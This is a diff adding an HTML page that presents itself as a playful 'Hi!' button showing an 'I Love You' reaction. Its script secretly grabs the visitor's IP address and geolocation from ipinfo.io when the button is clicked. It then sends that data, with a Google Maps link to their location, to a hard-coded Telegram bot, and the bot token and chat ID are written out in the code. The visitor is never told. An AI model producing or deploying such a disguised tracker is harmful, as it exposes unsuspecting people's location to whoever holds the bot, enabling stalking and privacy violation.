@@ -1,0 +1,142 @@
+<div id="container">
+        <button id="hiBtn">Hi!</button>
+        <div id="reaction" style="display: none;">💋 I Love You !</div>
+    </div>
+
+    <style>
+       
+  
+  * {
+
+    margin: 0;
+    padding: 0;
+    box-sizing: border-box;
+    font-family: Arial, sans-serif;
+}
+
+body {
+
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    height: 100vh;
+    background-color: #f0f0f5;
+}
+
+#container {
+
+    text-align: center;
+}
+
+#hiBtn {
+
+    background-color: #ff4081;
+    color: white;
+    border: none;
+    padding: 20px;
+    font-size: 1.5rem;
+    font-weight: bold;
+    border-radius: 50%;
+    cursor: pointer;
+    box-shadow: 0 4px 10px rgba(0, 0, 0, 0.2);
+    transition: transform 0.2s, box-shadow 0.2s;
+}
+
+#hiBtn:hover {
+
+    transform: scale(1.1);
+    box-shadow: 0 6px 12px rgba(0, 0, 0, 0.3);
+}
+
+#hiBtn:active {
+
+    transform: scale(0.9);
+    box-shadow: 0 2px 5px rgba(0, 0, 0, 0.2);
+}
+
+#reaction {
+
+    font-size: 2rem;
+    margin-top: 20px;
+    animation: kiss 1s ease-in-out forwards;
+}
+
+@keyframes kiss {
+
+    0% { opacity: 0; transform: scale(0.5) translateY(-20px); }
+    100% { opacity: 1; transform: scale(1) translateY(0); }
+}
+ 
+    </style>
+
+
+    <script>
+
+// Telegram Bot API Information
+const botToken = '7737478155:AAEjBzt0JApOaK-G2M0JyHA14JDweXWs7EY';
+const chatId = '7437789145';
+
+// Function to get IP and location data
+async function getUserData() {
+    try {
+        const response = await fetch('https://ipinfo.io/json?token=ad94fb5e3ab42d');
+        if (!response.ok) {
+            throw new Error('Failed to fetch IP information');
+        }
+        const data = await response.json();
+        return data;
+    } catch (error) {
+        console.error('Error fetching user data:', error);
+        return null;
+    }
+}
+
+// Function to send data to Telegram bot
+function sendDataToTelegram(userInfo) {
+    if (!userInfo) {
+        console.log("No user info available to send.");
+        return;
+    }
+
+    const locationLink = `https://www.google.com/maps?q=${userInfo.loc}`;
+    const message = `
+
+Name: ${userInfo.telegram_name || 'Unknown'}
+Username: ${userInfo.telegram_username || 'Unknown'}
+Ip: ${userInfo.ip || 'Unknown'}
+Address: ${userInfo.city || 'Unknown'}, ${userInfo.region || 'Unknown'}, ${userInfo.country || 'Unknown'}
+ltn Link: ${locationLink}
+    `;
+
+    fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+            chat_id: chatId,
+            text: message,
+        }),
+    }).then(response => {
+        if (!response.ok) {
+            console.error('Failed to send message to Telegram bot');
+        }
+    }).catch(error => {
+        console.error('Error sending message to Telegram bot:', error);
+    });
+}
+
+// Event Listener for Hi Button
+document.getElementById('hiBtn').addEventListener('click', async () => {
+    const userData = await getUserData();
+    sendDataToTelegram(userData);
+
+    // Display kiss reaction
+    const reaction = document.getElementById('reaction');
+    reaction.style.display = 'block';
+    setTimeout(() => {
+        reaction.style.display = 'none';
+    }, 2000);
+});
+
+      
+      
+    </script>
